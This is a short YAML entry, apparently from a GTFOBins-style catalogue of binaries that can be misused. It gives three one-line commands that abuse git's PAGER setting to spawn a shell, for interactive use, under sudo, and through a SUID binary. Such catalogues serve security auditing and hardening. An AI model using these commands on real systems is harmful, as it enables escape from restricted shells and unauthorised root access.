---
functions:
  execute-interactive:
    - code: PAGER='sh -c "exec sh 0<&1"' git -p help
  sudo-enabled:
    - code: PAGER='sh -c "exec sh 0<&1"' sudo -E git -p help
  suid-limited:
    - code: PAGER='sh -c "exec sh 0<&1"' ./git -p help
---
